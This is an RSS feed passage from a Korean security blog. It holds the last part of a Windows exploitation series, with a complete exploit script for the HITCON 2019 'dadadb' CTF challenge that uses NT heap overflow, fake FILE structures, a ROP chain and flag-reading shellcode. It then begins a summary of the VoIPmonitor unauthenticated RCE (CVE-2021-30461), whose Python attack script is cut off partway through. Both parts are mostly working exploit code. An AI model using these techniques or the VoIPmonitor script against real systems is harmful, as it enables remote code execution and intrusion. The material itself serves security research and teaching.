      <content:encoded><![CDATA[<h2 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p><p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</a></p><p>안녕하세요 L0ch입니다! 오늘 드디어 시리즈 마지막 글로 돌아왔습니다!</p><p>이전 글에서 heap overflow - LFH reuse attack으로 익스에 필요한 주소들을 leak 했으니 이제 남은 건 익스뿐입니다! 익스 하려면 갈 길이 머니 바로 본론으로 들어가보도록 하겠습니다.</p><h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>로그인 체크를 하는 <code>sub_10D0</code> 함수에서는 user와 password를 받고 <code>user.txt</code> 파일을 열어 비교한 뒤 로그인 성공 혹은 실패를 반환합니다.</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled.png" alt="pwncoolsexy-part5/Untitled.png"></p><p>입력한 user와 password가 저장되는 bss 영역을 보면 <code>input_pw+0x20</code> 위치에 파일 포인터가 저장되는 것을 볼 수 있네요!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%204.png" alt="pwncoolsexy-part5/Untitled 4.png"></p><p>그런데 user와 password를 입력받을 때 <code>0x20</code> 만큼 입력받네요. 그럼 파일 포인터를 overwrite 할 수 있겠죠? 이를 이용해 fake file structure를 구성하면 arbitrary write가 가능합니다.</p><p>대략적인 exploit 시나리오는 아래와 같습니다.</p><ol><li>heap overflow로 bss 영역에 fake chunk 생성</li><li>fake chunk에 fake file structure 구성</li><li>파일 포인터가 fake file structure를 가리키도록 overwrite</li><li>arbitrary write로 return address를 rop chain 주소로 overwrite</li><li>GET FLAG!!</li></ol><p>이제 시나리오대로 하나씩 살펴보도록 하겠습니다!</p><h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heap은 같은 크기의 해제된 chunk를 <code>ListHints</code>에서 double linked list로 관리합니다. 해제된 chunk의 data 위치에는 <code>fd</code> 와 <code>bk</code> 가 저장되고 각각 이전 chunk, 다음 chunk를 가리키며 이후에 같은 크기로 재 할당할 때 <code>ListHints</code>를 참조해 먼저 해제된 순서대로 할당합니다.</p><p><code>A~D</code>를 할당하고 <code>B</code>와 <code>D</code>를 해제한 뒤의 상황을 그림으로 간단하게 나타내면 아래와 같습니다. 리눅스의 Heap 관리랑 비슷한 면이 있네요. </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%205.png" alt="pwncoolsexy-part5/Untitled%205.png"></p><p><code>A chunk</code>에서 heap overflow를 트리거하면 해제된 <code>B chunk</code>의 주소와 <code>header</code>를 leak할 수 있습니다.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak B - header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span></code></pre><p>이제 <code>user</code>와 <code>pwd</code> 위치에 2개의 fake chunk를 만드는데, leak 한 <code>B chunk</code> 주소와 <code>header</code>를 이용해 <code>B chunk</code>와 연결되도록 합니다. 이때 각각의 fake chunk의 header에 기존 user와 password를 포함해야 로그인 체크 함수를 통과할 수 있습니다.  <code>B chunk</code>의 <code>fd</code>에는 우리가 만든 fake chunk를 가리키도록 overwrite 하면 되겠네요.</p><pre><code class="hljs php">user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)</code></pre><p>현재 free된 chunk들의 double linked list는 아래 그림과 같습니다!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%206.png" alt="pwncoolsexy-part5/Untitled%206.png"></p><p>다음은 <code>B chunk</code>에 fake file structure를 구성할 차례입니다. File Structure에 대한 자세한 내용은 <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> 슬라이드를 참고하면 되며 <code>_base</code> 필드에 임의의 주소를 쓰는 것으로 arbitrary write가 가능합니다. 따라서 <code>_base</code>에 return address를 주면 됩니다!</p><pre><code class="hljs php">cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span></code></pre><p>return address에는 stack base에서 <code>call &lt;func&gt;</code> 다음 instruction이 들어가므로 <code>write</code> 함수 호출 직후 instruction이 있는지 확인하면서 찾으면 쉽게 찾을 수 있습니다.</p><pre><code class="hljs php">ret_ins = imagebase+<span class="hljs-number">0x1b60</span>  ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span></code></pre><p>이제 해제한 <code>B chunk</code>를 재할당해 <code>B</code>에 fake file structure를 쓴 후 한번 더 할당하면 우리가 만든 fake chunk가 할당되는데, <code>pwd+0x20</code> 에 파일 포인터가 있었으니 header 크기 16 bytes를 제외한 16만큼 dummy를 채우고 <code>B chunk</code>의 주소로 파일 포인터를 overwrite 합니다.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span></code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>이제 남은 건 rop chain을 구성해서 <code>flag.txt</code>의 파일의 내용을 가져와 출력하기만 하면 됩니다! </p><ul><li><p><code>readfile</code>을 호출해 shellcode 입력</p><ul><li><p><code>stdin</code>, <code>stdout</code>은  <code>peb+0x20</code>에 위치한 <code>ProcessParameter</code> 구조체에서 leak</p><pre><code class="hljs python">process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre></li></ul></li><li><p><code>virtualprotect</code>로 shellcode 주소의 실행 권한 허용 후 shellcode로 jump</p></li><li><p>shellcode는 <code>flag.txt</code>를 읽어 stdout으로 출력</p></li></ul><p>필요한 gadget은 <a href="http://ropshell.com/search">http://ropshell.com</a> 에 익스 환경의 <code>ntdll.dll</code>을 업로드해 찾으면 되며<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> 는 <code>kernel32.dll</code>에서 찾을 수 있습니다.</p><p>아래는 전체 <code>exploit.py</code> 입니다. </p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">id,pw</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;User:&quot;</span>)p.sendline(id)p.recvuntil(<span class="hljs-string">&quot;Password:&quot;</span>)p.sendline(pw)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">key, size, data</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(size))p.recvuntil(<span class="hljs-string">&quot;Data&quot;</span>)p.send(data)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;3&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))context.arch = <span class="hljs-string">&quot;amd64&quot;</span><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;ddaa&quot;</span>,<span class="hljs-string">&quot;phdphd&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)<span class="hljs-comment">#leak heap base</span>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span><span class="hljs-comment">#leak next chunk key</span>p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]<span class="hljs-comment">#leak ntdll, imagebase, kernel32 base, stack</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>) <span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span><span class="hljs-comment"># leak from IAT</span>peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key,teb+<span class="hljs-number">0x10</span>)process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)ret_ins = imagebase+<span class="hljs-number">0x1b60</span> ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span>user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span><span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)login(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)virtualprotect = kernel32 + <span class="hljs-number">0x1afe0</span>readfile = kernel32 + <span class="hljs-number">0x22460</span>writefile = kernel32 + <span class="hljs-number">0x22550</span>createfile = kernel32 + <span class="hljs-number">0x220d0</span>pop_rdx_rcx_r8_to_r11 = ntdll + <span class="hljs-number">0x8d150</span>sc_address = imagebase + <span class="hljs-number">0x5000</span><span class="hljs-comment"># call readfile(stdin, sc_address, 0x100, sc_address+0x100)</span>rop_buf = p64(pop_rdx_rcx_r8_to_r11)rop_buf += p64(sc_address) + p64(stdin) + p64(<span class="hljs-number">0x100</span>) + p64(sc_address + <span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(readfile)<span class="hljs-comment"># call virtualprotect(sc_address, 0x1000, 0x40, sc_address+0x100-8)  </span>rop_buf += p64(pop_rdx_rcx_r8_to_r11) rop_buf += p64(<span class="hljs-number">0x1000</span>) + p64(sc_address) + p64(<span class="hljs-number">0x40</span>) + p64(sc_address + <span class="hljs-number">0x100</span> <span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(virtualprotect) + p64(sc_address)p.send(rop_buf.ljust(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)+p64(<span class="hljs-number">4</span>))shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><span class="hljs-string">jmp readflag</span><span class="hljs-string">flag:</span><span class="hljs-string">pop r11</span><span class="hljs-string">createfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x30], 0</span><span class="hljs-string">mov qword ptr [rsp + 0x28], 0x80</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 3</span><span class="hljs-string">xor r9, r9</span><span class="hljs-string">mov r8, 1</span><span class="hljs-string">mov rdx, 0x80000000</span><span class="hljs-string">mov rcx, r11</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;createfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">readfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, rax</span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;readfile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">writefile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, <span class="hljs-subst">&#123;stdout&#125;</span></span><span class="hljs-string">mov rax, <span class="hljs-subst">&#123;writefile&#125;</span></span><span class="hljs-string">call rax</span><span class="hljs-string">loop:</span><span class="hljs-string">jmp loop</span><span class="hljs-string">readflag:</span><span class="hljs-string">call flag</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>shellcode = (asm(shellcode) + <span class="hljs-string">&quot;flag.txt\x00&quot;</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;\x90&quot;</span>)p.send(shellcode)p.interactive()</code></pre><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%207.png" alt="pwncoolsexy-part5/Untitled%207.png"></p><p>험난했다… </p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><p>드디어 폰쿨섹시 시리즈 마지막 글까지 모두 끝났습니다 짞짝ㅉㅏㄱ !  </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%201.png" alt="pwncoolsexy-part5/Untitled%201.png"></p><p>오랜만에 Part 1 글을 보면서 시리즈 목표를 다시 봤는데.. 원래 계획에 딱 맞게 Part 5로 마무리됐네요. 사실 거의 무계획이나 다름없었는데 다행이다 휴ㅎ; </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%202.png" alt="pwncoolsexy-part5/Untitled%202.png"></p><p>약 3개월간 진행한 정든 시리즈를 떠나보내며.. 이 글이 윈도우를 처음 시작하시는 분들께 많은 도움이 되었으면 좋겠습니다. 이제 다음은 뭘 할지 고민해야 하는데 아 뭐하지 ㅁㄴㅇㄹ </p><p>그럼 한동안은 그동안 봐 두었던 번역글과 하루한줄로 돌아오겠습니다! </p><ul><li>모든 시리즈 글의 오류 및 오타 지적은 언제나 환영입니다</li></ul><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%203.png" alt="pwncoolsexy-part5/Untitled%203.png"></p><blockquote><p>진짜 끝!</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/lfh/">lfh</category>
      
      <category domain="https://hackyboiz.github.io/tags/nt-heap/">nt heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/hitcon/">hitcon</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/09/l0ch/pwncoolsexy-part5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30461: VoIPmonitor RCE</title>
      <link>https://hackyboiz.github.io/2021/05/08/fabu1ous/2021-05-08/</link>
      <guid>https://hackyboiz.github.io/2021/05/08/fabu1ous/2021-05-08/</guid>
      <pubDate>Sat, 08 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-voipmonitor-unaut</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/">VoIPmonitor UnAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>VoIPmonitor &lt;= 24.60</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>오픈소스 network packet sniffer인 VoIPmonitor에서 RCE취약점이 발견되었습니다. 해당 취약점은 <code>SPOOLDIR</code> 혹은 <code>recheck</code> 파라미터를 사용하는 POST 요청을 처리할 때 발생합니다. <code>SPOOLDIR</code> 파라미터 값은 UI 인터페이스가 호출하는 <code>config/configuration.php</code>에 아무런 필터나 가공 없이 있는 그대로 삽입됩니다. 이는 인증되지 않은 사용자라도 웹 인터페이스를 통해 임의의 PHP 코드를 원격으로 실행할 수 있게 해  줍니다. </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv,exit<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> string<span class="hljs-keyword">try</span>:    <span class="hljs-keyword">import</span> requests<span class="hljs-keyword">except</span> ImportError:    print(<span class="hljs-string">&quot;pip3 install requests &quot;</span>)print(<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">###############################################</span><span class="hljs-string">#              VOIP Monitor RCE               #</span><span class="hljs-string">###############################################</span><span class="hljs-string">&quot;&quot;&quot;</span>)headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_target</span>(<span class="hljs-params">args</span>):</span>    hostname = args.host    path = args.path    <span class="hljs-keyword">if</span> path:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/index.php&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/index.php&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_tmp</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    n_data = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    set_totmp = requests.post(target, n_data, headers=headers)    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">&#123;set_totmp&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkVulnerability</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)    testcmd = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span 